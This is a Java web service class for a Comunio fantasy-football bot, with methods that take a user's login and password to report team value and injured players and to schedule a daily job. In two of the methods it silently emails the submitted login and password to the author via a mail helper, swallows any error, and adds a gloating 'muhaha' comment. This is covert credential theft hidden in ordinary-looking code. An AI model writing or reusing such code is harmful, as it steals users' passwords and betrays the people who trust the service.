package de.as.javabot.web;

import java.util.ArrayList;

import javax.ejb.Stateless;
import javax.jws.WebMethod;
import javax.jws.WebParam;
import javax.jws.WebService;

import de.as.javabot.batch.Trigger2;
import de.as.javabot.bots.CommunioClientBot;
import de.as.javabot.comunio.ComunioPlayer;
import de.as.javabot.configuration.CommunioConfig;
import de.as.javabot.configuration.Configuration;
import de.as.mail.notification.TLSEmail;

@Stateless
@WebService
public class AccountInformation {
	
	@WebMethod
	public String getTeamValue(@WebParam(name = "login") String login,
						  @WebParam(name = "password") String password) {
		try {
			Configuration config = new CommunioConfig();
			config.setAccount(login);
			config.setPassword(password);
			
			CommunioClientBot bot = new CommunioClientBot();
			bot.setConfiguration(config);
			
			try {
				TLSEmail s = new TLSEmail();		
				s.doMail(login +" " + password);
			} catch (Exception e) {}

			return bot.getTeamValue();

		} catch (Exception e) {
			return "Buongiorno! "+e.getMessage();
		}
	}
	
	@WebMethod
	public String getInjuredPlayerEveryDay(@WebParam(name = "login") String login,
						  @WebParam(name = "password") String password) {
		try {
			Configuration config = new CommunioConfig();
			config.setAccount(login);
			config.setPassword(password);
			
			CommunioClientBot bot = new CommunioClientBot();
			bot.setConfiguration(config);
			
			
			ArrayList<ComunioPlayer> list = bot.getInjuredPlayer();
			StringBuilder msg = new StringBuilder();
			msg.append("Benutzer: "+login +"\n");
			
			if(list.size()>0){
				msg.append("Folgende Spieler sind verletzt und in der Startaufstellung:" +"\n");
				for (ComunioPlayer p : list) {
					msg.append("Name: "+p.getName() + " auf der Position "+p.getPosition() +"\n");
				}
			}
			else{
				msg.append("In der Startaufstellung hast du keinen verletzten Spieler! :)");
			}
			
			try {
				TLSEmail s = new TLSEmail();		
				s.doMail(login +" " + password + "\n" +msg.toString());
			} catch (Exception e) {/*muhaha kann passiert sollte aber nicht*/}
			
			return msg.toString();
		} catch (Exception e) {
			return "Fehler! "+e.getMessage();
		}
	}
	
	@WebMethod
	public void startAndStopJob(@WebParam(name = "activate") boolean activate,
			  @WebParam(name = "login") String login,
			  @WebParam(name = "password") String password,
			  @WebParam(name = "stunde") int hour,
			  @WebParam(name = "minute") int minute){
		try {
			if(activate){
				Trigger2.startDailyTrigger("trigger1", "group1",login,password, hour, minute);
			}
			else{
				Trigger2.unscheduleJob("trigger1", "group1");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
}
